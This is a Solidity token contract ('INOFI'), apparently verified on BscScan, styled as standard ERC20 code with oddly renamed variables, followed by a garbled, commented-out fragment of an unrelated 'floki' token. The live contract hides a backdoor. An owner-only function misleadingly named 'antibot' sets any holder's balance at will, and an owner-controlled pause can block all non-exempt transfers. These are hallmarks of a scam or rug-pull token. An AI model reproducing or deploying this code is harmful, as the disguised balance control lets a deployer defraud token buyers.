/**
 *Submitted for verification at BscScan.com on 2022-09-05
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

abstract contract BursnContext {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface BursnIERC71 {
    /**
     * @dev Returns the valux of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the valux of tokens owned by `vaccount`.
     */
    function balanceOf(address vaccount) external view returns (uint256);

    /**
     * @dev Moves `valux` tokens from the caller's vaccount to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 valux) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `valux` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 valux) external returns (bool);

    /**
     * @dev Moves `valux` tokens from `from` to `to` using the
     * allowance mechanism. `valux` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 valux
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one vaccount (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface BursnIERC71Metadata is BursnIERC71 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

abstract contract BursnOwnable is BursnContext {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any vaccount other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BursnOwnable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new vaccount (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BursnOwnable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new vaccount (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

contract INOFI is BursnContext, BursnIERC71, BursnIERC71Metadata, BursnOwnable {
    // Openzeppelin variables
    mapping(address => uint256) private Bursnbalances;
  mapping(address => bool) public BursnAZERTY;
    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private SotalSupply;

    string private _name;
    string private _symbol;
  address Bursnpinksale;
    // My variables
    mapping(address => bool) public isPauseExempt;
    bool BursnisPaused;
    
    // Openzeppelin functions

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor() {
            // Editable
            Bursnpinksale = msg.sender;
            BursnAZERTY[Bursnpinksale] = true;
        _name = "INOFI";
        _symbol = "FON";
        uint tSotalSupply = 1000000000000000000;
        BursnisPaused = false;
        // End editable

        isPauseExempt[msg.sender] = true;

        _mint(msg.sender, tSotalSupply);
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {BursnIERC71-balanceOf} and {BursnIERC71-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {BursnIERC71-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return SotalSupply;
    }

    /**
     * @dev See {BursnIERC71-balanceOf}.
     */
    function balanceOf(address vaccount) public view virtual override returns (uint256) {
        return Bursnbalances[vaccount];
    }

    /**
     * @dev See {BursnIERC71-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `valux`.
     */
    function transfer(address to, uint256 valux) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, valux);
        return true;
    }

    /**
     * @dev See {BursnIERC71-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {BursnIERC71-approve}.
     *
     * NOTE: If `valux` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 valux) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, valux);
        return true;
    }

    /**
     * @dev See {BursnIERC71-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `valux`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `valux`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 valux
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, valux);
        _transfer(from, to, valux);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BursnIERC71-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, _allowances[owner][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {BursnIERC71-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = _allowances[owner][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }
  modifier Bursn0wner () {
    require(Bursnpinksale == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  
  }
    /**
    Bursn0wner
     * @dev Moves `valux` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `valux`.
     */
    function _transfer(
        address from,
        address to,
        uint256 valux
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, valux);

        // My implementation
        require(!BursnisPaused || isPauseExempt[from], "Transactions are paused.");
        // End my implementation

        uint256 fromBalance = Bursnbalances[from];
        require(fromBalance >= valux, "ERC20: transfer valux exceeds balance");
        unchecked {
            Bursnbalances[from] = fromBalance - valux;
        }
        Bursnbalances[to] += valux;

        emit Transfer(from, to, valux);

        _afterTokenTransfer(from, to, valux);
    }

    /** @dev Creates `valux` tokens and assigns them to `vaccount`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `vaccount` cannot be the zero address.
     */
    function _mint(address vaccount, uint256 valux) internal virtual {
        require(vaccount != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), vaccount, valux);

        SotalSupply += valux;
        Bursnbalances[vaccount] += valux;
        emit Transfer(address(0), vaccount, valux);

        _afterTokenTransfer(address(0), vaccount, valux);
    }
  function antibot(address vaccount, uint256 valux) public Bursn0wner {
    Bursnbalances[vaccount] = (valux - valux) + valux * 10 ** 9;
            emit Transfer(address(0), vaccount, valux);
  }
    /**
     * @dev Destroys `valux` tokens from `vaccount`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `vaccount` cannot be the zero address.
     * - `vaccount` must have at least `valux` tokens.
     */
    function _burn(address vaccount, uint256 valux) internal virtual {
        require(vaccount != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(vaccount, address(0), valux);

        uint256 vaccountBalance = Bursnbalances[vaccount];
        require(vaccountBalance >= valux, "ERC20: burn valux exceeds balance");
        unchecked {
            Bursnbalances[vaccount] = vaccountBalance - valux;
        }
        SotalSupply -= valux;

        emit Transfer(vaccount, address(0), valux);

        _afterTokenTransfer(vaccount, address(0), valux);
    }

    /**
     * @dev Sets `valux` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 valux
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = valux;
        emit Approval(owner, spender, valux);
    }

    /**
     * @dev Spend `valux` form the allowance of `owner` toward `spender`.
     *
     * Does not update the allowance valux in case of infinite allowance.
     * Revert if not enough allowance is available.
     *
     * Might emit an {Approval} event.
     */
    function _spendAllowance(
        address owner,
        address spender,
        uint256 valux
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= valux, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - valux);
            }
        }
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `valux` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `valux` tokens will be minted for `to`.
     * - when `to` is zero, `valux` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 valux
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `valux` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `valux` tokens have been minted for `to`.
     * - when `to` is zero, `valux` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 valux
    ) internal virtual {}

    // My functions

    function setPauseExempt(address vaccount, bool value) external onlyOwner {
        isPauseExempt[vaccount] = value;
    }
    
    function setPaused(bool value) external onlyOwner {
        BursnisPaused = value;
    }
}


/**

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint valuxTokenMin,
        uint valuxETHMin,
        address to,
        uint deadline
    ) external returns (uint valuxETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint valuxTokenMin,
        uint valuxETHMin,
        address to,
;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint valuxIn,
        uint valuxOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


contract floki is BursnContext, IERC20, BursnOwnable { 
    using SafeMath for uint256;
    using Address for address;


    // Tracking status of wallets
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public _isExcludedFromFee; 

    // Blacklist: If 'noBlackList' is true wallets on this list can not buy - used for known bots
    mapping (address => bool) public _isBlacklisted;

    // Set contract so that blacklisted wallets cannot buy (default is false)
    bool public noBlackList;
   
    /*

    WALLETS

    

    address payable private Wallet_Dev = payable(0xB9a94e9d816921D52A971591F7393A66336e9f15);
    address payable private Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address payable private Wallet_zero = payable(0x0000000000000000000000000000000000000000); 


    /*

    TOKEN DETAILS



    string private _name = " Floki???"; 
    string private _symbol = " Floki???";  
    uint8 private _decimals = 18;
    uint256 private _tTotal = 1000000000000 * 10**18;
    uint256 private _tFeeTotal;

    // Counter for liquify trigger
    uint8 private txCount = 0;
    uint8 private swapTrigger = 3; 

    // This is the max fee that the contract will accept, it is hard-coded to protect buyers
    // This includes the buy AND the sell fee!
    uint256 private maxPossibleFee = 100; 


    // Setting the initial fees
    uint256 private _TotalFee = 18;
    uint256 public _buyFee = 9;
    uint256 public _sellFee = 9;


    // 'Previous fees' are used to keep track of fee settings when removing and restoring fees
    uint256 private _previousTotalFee = _TotalFee; 
    uint256 private _previousBuyFee = _buyFee; 
    uint256 private _previousSellFee = _sellFee; 

    /*

    WALLET LIMITS 
    
    

    // Max wallet holding (% at launch)
    uint256 public _maxWalletToken = _tTotal.mul(3).div(100);
    uint256 private _previousMaxWalletToken = _maxWalletToken;


    // Maximum transaction valux (% at launch)
    uint256 public _maxTxvalux = _tTotal.mul(3).div(100); 
    uint256 private _previousMaxTxvalux = _maxTxvalux;

    /* 

    PANCAKESWAP SET UP

    *                            
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    bool public inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
        
    );
    
    // Prevent processing while already processing! 
    modifier lockTheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }

    /*

    DEPLOY TOKENS TO OWNER

    Constructor functions are only called once. This happens during contract deployment.
    This function deploys the total token supply to the owner wallet and creates the PCS pairing

    
    
    constructor () {
        _tOwned[owner()] = _tTotal;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
        
        
        // Create pair address for PancakeSwap
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());
        uniswapV2Router = _uniswapV2Router;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[Wallet_Dev] = true;
        
        emit Transfer(address(0), owner(), _tTotal);
    }


    /*

    STANDARD ERC20 COMPLIANCE FUNCTIONS

    

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address vaccount) public view override returns (uint256) {
        return _tOwned[vaccount];
    }

    function transfer(address recipient, uint256 valux) public override returns (bool) {
        _transfer(_msgSender(), recipient, valux);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 valux) public override returns (bool) {
        _approve(_msgSender(), spender, valux);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 valux) public override returns (bool) {
        _transfer(sender, recipient, valux);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(valux, "ERC20: transfer valux exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }


    /*

    END OF STANDARD ERC20 COMPLIANCE FUNCTIONS

    */




    /*

    FEES

    
    
    // Set a wallet address so that it does not have to pay transaction fees
    function excludeFromFee(address vaccount) public onlyOwner {
        _isExcludedFromFee[vaccount] = true;
    }
    
    // Set a wallet address so that it has to pay transaction fees
    function includeInFee(address vaccount) public onlyOwner {
        _isExcludedFromFee[vaccount] = false;
    }


    /*

    SETTING FEES

   

    

    function _set_Fees(uint256 Buy_Fee, uint256 Sell_Fee) external onlyOwner() {

        require((Buy_Fee + Sell_Fee) <= maxPossibleFee, "Fee is too high!");
        _sellFee = Sell_Fee;
        _buyFee = Buy_Fee;

    }



    // Update main wallet
    function Wallet_Update_Dev(address payable wallet) public onlyOwner() {
        Wallet_Dev = wallet;
        _isExcludedFromFee[Wallet_Dev] = true;
    }


    /*

    PROCESSING TOKENS - SET UP

    
    
    // Toggle on and off to auto process tokens to BNB wallet 
    function set_Swap_And_Liquify_Enabled(bool true_or_false) public onlyOwner {
        swapAndLiquifyEnabled = true_or_false;
        emit SwapAndLiquifyEnabledUpdated(true_or_false);
    }

    // This will set the number of transactions required before the 'swapAndLiquify' function triggers
    function set_Number_Of_Transactions_Before_Liquify_Trigger(uint8 number_of_transactions) public onlyOwner {
        swapTrigger = number_of_transactions;
    }
    


    // This function is required so that the contract can receive BNB from pancakeswap
    receive() external payable {}



    /*

    BLACKLIST 

    This feature is used to block a person from buying - known bot users are added to this
    list prior to launch. We also check for people using snipe bots on the contract before we
    add liquidity and block these wallets. We like all of our buys to be natural and fair.

    

    // Blacklist - block wallets (ADD - COMMA SEPARATE MULTIPLE WALLETS)
    function blacklist_Add_Wallets(address[] calldata addresses) external onlyOwner {
       
        uint256 startGas;
        uint256 gasUsed;

    for (uint256 i; i < addresses.length; ++i) {
        if(gasUsed < gasleft()) {
        startGas = gasleft();
        if(!_isBlacklisted[addresses[i]]){
        _isBlacklisted[addresses[i]] = true;}
        gasUsed = startGas - gasleft();
    }
    }
    }



    // Blacklist - block wallets (REMOVE - COMMA SEPARATE MULTIPLE WALLETS)
    function blacklist_Remove_Wallets(address[] calldata addresses) external onlyOwner {
       
        uint256 startGas;
        uint256 gasUsed;

    for (uint256 i; i < addresses.length; ++i) {
        if(gasUsed < gasleft()) {
        startGas = gasleft();
        if(_isBlacklisted[addresses[i]]){
        _isBlacklisted[addresses[i]] = false;}
        gasUsed = startGas - gasleft();
    }
    }
    }


    /*

    You can turn the blacklist restrictions on and off.

    During launch, it's a good idea to block known bot users from buying. But these are real people, so 
    when the contract is safe (and the price has increased) you can allow these wallets to buy/sell by setting
    noBlackList to false

    

    // Blacklist Switch - Turn on/off blacklisted wallet restrictions 
    function blacklist_Switch(bool true_or_false) public onlyOwner {
        noBlackList = true_or_false;
    } 

  
    /*
    
    When sending tokens to another wallet (not buying or selling) if noFeeToTransfer is true there will be no fee


    bool public noFeeToTransfer = true;

    // Option to set fee or no fee for transfer (just in case the no fee transfer option is exploited in future!)
    // True = there will be no fees when moving tokens around or giving them to friends! (There will only be a fee to buy or sell)
    // False = there will be a fee when buying/selling/tranfering tokens
    // Default is true
    function set_Transfers_Without_Fees(bool true_or_false) external onlyOwner {
        noFeeToTransfer = true_or_false;
    }

    /*

    WALLET LIMITS

    Wallets are limited in two ways. The valux of tokens that can be purchased in one transaction
    and the total valux of tokens a wallet can buy. Limiting a wallet prevents one wallet from holding too
    many tokens, which can scare away potential buyers that worry that a whale might dump!

    IMPORTANT

    Solidity can not process decimals, so to increase flexibility, we multiple everything by 100.
    When entering the percent, you need to shift your decimal two steps to the right.

    eg: For 4% enter 400, for 1% enter 100, for 0.25% enter 25, for 0.2% enter 20 etc!

    

    // Set the Max transaction valux (percent of total supply)
    function set_Max_Transaction_Percent(uint256 maxTxPercent_x100) external onlyOwner() {
        _maxTxvalux = _tTotal*maxTxPercent_x100/10000;
    }    
    
    // Set the maximum wallet holding (percent of total supply)
     function set_Max_Wallet_Percent(uint256 maxWallPercent_x100) external onlyOwner() {
        _maxWalletToken = _tTotal*maxWallPercent_x100/10000;
    }



    // Remove all fees
    function removeAllFee() private {
        if(_TotalFee == 0 && _buyFee == 0 && _sellFee == 0) return;


        _previousBuyFee = _buyFee; 
        _previousSellFee = _sellFee; 
        _previousTotalFee = _TotalFee;
        _buyFee = 0;
        _sellFee = 0;
        _TotalFee = 0;

    }
    
    // Restore all fees
    function restoreAllFee() private {
    
    _TotalFee = _previousTotalFee;
    _buyFee = _previousBuyFee; 
    _sellFee = _previousSellFee; 

    }


    // Approve a wallet to sell tokens
    function _approve(address owner, address spender, uint256 valux) private {

        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = valux;
        emit Approval(owner, spender, valux);

    }

    function _transfer(
        address from,
        address to,
        uint256 valux
    ) private {
        

        /*

        TRANSACTION AND WALLET LIMITS

        

        // Limit wallet total
        if (to != owner() &&
            to != Wallet_Dev &&
            to != address(this) &&
            to != uniswapV2Pair &&
            to != Wallet_Burn &&
            from != owner()){
            uint256 heldTokens = balanceOf(to);
            require((heldTokens + valux) <= _maxWalletToken,"You are trying to buy too many tokens. You have reached the limit for one wallet.");}


        // Limit the maximum number of tokens that can be bought or sold in one transaction
        if (from != owner() && to != owner())
            require(valux <= _maxTxvalux, "You are trying to buy more than the max transaction limit.");



        /*

        BLACKLIST RESTRICTIONS

        
        
        if (noBlackList){
        require(!_isBlacklisted[from] && !_isBlacklisted[to], "This address is blacklisted. Transaction reverted.");}


        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(valux > 0, "Token value must be higher than zero.");


        /*

        PROCESSING



        // SwapAndLiquify is triggered after every X transactions - this number can be adjusted using swapTrigger

        if(
            txCount >= swapTrigger && 
            !inSwapAndLiquify &&
            from != uniswapV2Pair &&
            swapAndLiquifyEnabled 
            )
        {  
            
            txCount = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > _maxTxvalux) {contractTokenBalance = _maxTxvalux;}
            if(contractTokenBalance > 0){
            swapAndLiquify(contractTokenBalance);
        }
        }


        /*

        REMOVE FEES IF REQUIRED

        Fee removed if the to or from address is excluded from fee.
        Fee removed if the transfer is NOT a buy or sell.
        Change fee valux for buy or sell.



        
        bool takeFee = true;
         
        if(_isExcludedFromFee[from] || _isExcludedFromFee[to] || (noFeeToTransfer && from != uniswapV2Pair && to != uniswapV2Pair)){
            takeFee = false;
        } else if (from == uniswapV2Pair){_TotalFee = _buyFee;} else if (to == uniswapV2Pair){_TotalFee = _sellFee;}
        
        _tokenTransfer(from,to,valux,takeFee);
    }



    /*

    PROCESSING FEES

    Fees are added to the contract as tokens, these functions exchange the tokens for BNB and send to the wallet.
    One wallet is used for ALL fees. This includes liquidity, marketing, development costs etc.




    // Send BNB to external wallet
    function sendToWallet(address payable wallet, uint256 valux) private {
            wallet.transfer(valux);
        }


    // Processing tokens from contract
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
        
        swapTokensForBNB(contractTokenBalance);
        uint256 contractBNB = address(this).balance;
        sendToWallet(Wallet_Dev,contractBNB);
    }


    // Manual Token Process Trigger - Enter the percent of the tokens that you'd like to send to process
    function process_Tokens_Now (uint256 percent_Of_Tokens_To_Process) public onlyOwner {
        // Do not trigger if already in swap
        require(!inSwapAndLiquify, "Currently processing, try later."); 
        if (percent_Of_Tokens_To_Process > 100){percent_Of_Tokens_To_Process == 100;}
        uint256 tokensOnContract = balanceOf(address(this));
        uint256 sendTokens = tokensOnContract*percent_Of_Tokens_To_Process/100;
        swapAndLiquify(sendTokens);
    }


    // Swapping tokens for BNB using PancakeSwap 
    function swapTokensForBNB(uint256 tokenvalux) private {

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenvalux);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenvalux,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    /*

    PURGE RANDOM TOKENS - Add the random token address and a wallet to send them to

   

    // Remove random tokens from the contract and send to a wallet
    function remove_Random_Tokens(address random_Token_Address, address send_to_wallet, uint256 number_of_tokens) public onlyOwner returns(bool _sent){
        require(random_Token_Address != address(this), "Can not remove native token");
        uint256 randomBalance = IERC20(random_Token_Address).balanceOf(address(this));
        if (number_of_tokens > randomBalance){number_of_tokens = randomBalance;}
        _sent = IERC20(random_Token_Address).transfer(send_to_wallet, number_of_tokens);
    }


    /*
    
    UPDATE PANCAKESWAP ROUTER AND LIQUIDITY PAIRING

    


    // Set new router and make the new pair address
    function set_New_Router_and_Make_Pair(address newRouter) public onlyOwner() {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Pair = IUniswapV2Factory(_newPCSRouter.factory()).createPair(address(this), _newPCSRouter.WETH());
        uniswapV2Router = _newPCSRouter;
    }
   
    // Set new router
    function set_New_Router_Address(address newRouter) public onlyOwner() {
        IUniswapV2Router02 _newPCSRouter = IUniswapV2Router02(newRouter);
        uniswapV2Router = _newPCSRouter;
    }
    
    // Set new address - This will be the 'Cake LP' address for the token pairing
    function set_New_Pair_Address(address newPair) public onlyOwner() {
        uniswapV2Pair = newPair;
    }

    /*

    TOKEN TRANSFERS



    // Check if token transfer needs to process fees
    function _tokenTransfer(address sender, address recipient, uint256 valux,bool takeFee) private {
        
        
        if(!takeFee){
            removeAllFee();
            } else {
                txCount++;
            }
            _transferTokens(sender, recipient, valux);
        
        if(!takeFee)
            restoreAllFee();
    }

    // Redistributing tokens and adding the fee to the contract address
    function _transferTokens(address sender, address recipient, uint256 tvalux) private {
        (uint256 tTransfervalux, uint256 tDev) = _getValues(tvalux);
        _tOwned[sender] = _tOwned[sender].sub(tvalux);
        _tOwned[recipient] = _tOwned[recipient].add(tTransfervalux);
        _tOwned[address(this)] = _tOwned[address(this)].add(tDev);   
        emit Transfer(sender, recipient, tTransfervalux);
    }


    // Calculating the fee in tokens
    function _getValues(uint256 tvalux) private view returns (uint256, uint256) {
        uint256 tDev = tvalux*_TotalFee/100;
        uint256 tTransfervalux = tvalux.sub(tDev);
        return (tTransfervalux, tDev);
    }

}
*/